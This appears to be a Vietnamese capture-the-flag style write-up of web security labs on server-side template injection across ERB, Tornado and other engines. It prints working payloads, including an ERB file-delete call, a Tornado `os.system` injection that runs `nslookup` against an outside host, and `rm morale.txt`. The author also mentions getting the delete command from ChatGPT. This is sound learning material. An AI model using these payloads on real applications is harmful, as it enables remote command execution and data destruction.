![image](https://github.com/user-attachments/assets/7e64cc62-af5b-4352-8058-ea37de950a0b)

Đây là giao diện, hiện tại thì chưa thấy có gì:

![image](https://github.com/user-attachments/assets/83f29181-d186-4130-94b2-0c1b3582fb8e)

Khi ấn vào cái đầu tiên thì nó hiện ra Unfortunately this product is out of stock, còn cái khác vẫn ra thông tin:

![image](https://github.com/user-attachments/assets/6062dc78-1f1e-4312-a941-96733d25356c)

Và req đây:

![image](https://github.com/user-attachments/assets/b5219a65-535b-4833-986b-c25139be301e)

Sau khi fuzz nhanh qua message thì tôi thấy cái `<%=77*77%>` là nó tính ra được kết quả:

![image](https://github.com/user-attachments/assets/84d24c9b-786f-4405-9cac-073f62e7f67f)

Tôi hỏi chatgpt để lấy lệnh xóa file trong ERB template

![image](https://github.com/user-attachments/assets/d7afb287-cd43-4cd9-b156-163262e1f2e8)

![image](https://github.com/user-attachments/assets/becd0cc2-a85a-4e94-ba23-55aaca0a7cf3)

`<% File.delete("morale.txt")%>`

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/74e78801-b2e7-41dc-a95a-b8da70e57d17)

Giao diện sau khi đăng nhập với wiener đây:

![image](https://github.com/user-attachments/assets/b0571ab2-f8c2-4d2b-91fb-c330329758e0)

Đây là req sau khi chọn cái preferred name:

![image](https://github.com/user-attachments/assets/d634a163-3ab9-46ce-bf09-b43ffe25ccaf)

Do nó tên là blog-post-author-display nên tôi thử vào mấy cái blog post, để lại comment, và tính năng của cái đấy là sẽ hiển thị tên của tôi ở 3 dạng:

![image](https://github.com/user-attachments/assets/85c5f60c-d344-4c68-aa33-7a0eca17ebbf)

Nếu search cái Tornado template thì ra cái payload:

![image](https://github.com/user-attachments/assets/3c3d0ae9-c2fd-4cb6-bd6a-44e0143ed261)

Sau khi tôi chèn `{{77*77}}` thì ra kết quả `{{5929}}`, nó hoạt động:

![image](https://github.com/user-attachments/assets/90020b7b-3871-44d2-8656-9fb42f0d0a55)

Tôi chèn `{%import os%}{{os.system('nslookup oastify.com')}}` vào blog-post-author-display:

![image](https://github.com/user-attachments/assets/99fb986d-d40c-452e-8087-7af9b044b6a0)

Cái này có vẻ là do đang dùng trong mấy cái name các thứ kia thì tôi lại chạy nên nó xảy ra lỗi, thế nên tôi sửa thành `user.first_name}}{%import os%}{{os.system('nslookup oastify.com')}}` nhằm tạo hẳn 1 cái mới

![image](https://github.com/user-attachments/assets/aa06cb6c-4454-435e-aa88-21f7e8a478a0)

![image](https://github.com/user-attachments/assets/ae1520a2-c0aa-4f7c-abce-d9bbf98efeb7)

Đổi sang `rm morale.txt` là xong

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/aac6ee4c-de09-4681-b809-cdb110a2ff14)

Vào bài post thì có thể sửa được cái template:

![image](https://github.com/user-attachments/assets/aa0d55d3-be78-4dd7-8640-011d71aa4718)

Req đấy đây:

![image](https://github.com/user-attachments/assets/69f33089-6f31-4ee7-8652-12077da42c8d)

Do `${}` có nhiều loại nên không phải cái nào cũng được

![image](https://github.com/user-attachments/assets/78f87e68-e8bd-44e0-97e6-603837e7db98)

Sau 1 lúc mò payload ssti trong [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md) thì ra được cái `${77*77}`:

![image](https://github.com/user-attachments/assets/a0eae38a-5d50-459d-9da4-9340acc8add1)

Sau 1 lúc tìm payload trong [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md), đến đoạn java thì được:

![image](https://github.com/user-attachments/assets/f2f0eb62-faca-4f33-af31-e932d1b3d9a1)

![image](https://github.com/user-attachments/assets/bcb6a021-85e6-4564-8db3-496f158eb00e)

Đổi sang xóa là xong

![image](https://github.com/user-attachments/assets/18c1380e-5120-4575-aedf-4449d84cb3b5)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/d7975839-9de2-4df6-b66d-501a7ef9b3ec)

Khi ấn view detail cái đầu tiên thì ra Unfortunately this product is out of stock:

![image](https://github.com/user-attachments/assets/bd87d20b-6c0e-43e9-a66c-825bb4823ced)

![image](https://github.com/user-attachments/assets/110714c6-70ba-4d6d-afbc-8df58760baea)

Tôi lấy bừa cái [wordlist](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt) trên mạng để chạy thì có 1 số cái gây ra lỗi:

![image](https://github.com/user-attachments/assets/41323ee5-8333-4011-b6e4-3f24687e2949)

Sau khi xác định được đây là javascript, tôi đi mày mò payload ở trong [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md) thì có cái này:

![image](https://github.com/user-attachments/assets/88448207-5c0f-4598-873b-56eb25b40ef1)

Encode url rồi ném vào message thì được:

![image](https://github.com/user-attachments/assets/5b526a05-3392-46f7-bc69-f973820ae06f)

Đổi sang rm là được:

![image](https://github.com/user-attachments/assets/f9aefd62-73f9-48c6-a5ee-8bbf45030e56)

<h1>---------------------------------------------------------</h1>
<br>










































